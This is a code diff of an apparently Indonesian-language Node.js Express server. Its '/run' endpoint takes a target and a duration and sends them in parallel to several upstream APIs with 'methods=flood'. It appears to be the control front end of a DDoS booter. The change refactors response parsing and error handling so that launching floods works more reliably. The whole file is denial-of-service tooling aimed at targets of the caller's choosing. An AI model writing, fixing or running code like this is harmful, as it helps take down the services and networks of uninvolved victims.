@@ -17,11 +17,29 @@ app.use((req, res, next) => {
   next();
 });
 
+// helper fetch + parse JSON
+async function fetchAndParse(url) {
+  try {
+    const res = await fetch(url);
+    const text = await res.text();
+
+    try {
+      return JSON.parse(text); // 🔥 FIX UTAMA
+    } catch {
+      return { raw: text };
+    }
+
+  } catch (err) {
+    return { error: err.toString() };
+  }
+}
+
 app.get("/run", async (req, res) => {
   const { target, time } = req.query;
 
   if (!target || !time) {
     return res.status(400).json({
+      success: false,
       error: "target & time wajib diisi"
     });
   }
@@ -31,16 +49,19 @@ app.get("/run", async (req, res) => {
       `${base}?target=${encodeURIComponent(target)}&time=${time}&methods=flood`
     );
 
-    const responses = await Promise.all(urls.map(url => fetch(url)));
-    const results = await Promise.all(responses.map(r => r.text()));
+    const results = await Promise.all(
+      urls.map(url => fetchAndParse(url))
+    );
 
     res.json({
       success: true,
+      count: results.length,
       results
     });
 
   } catch (err) {
-    res.status(500).json({
+    res.json({
+      success: false,
       error: err.toString()
     });
   }
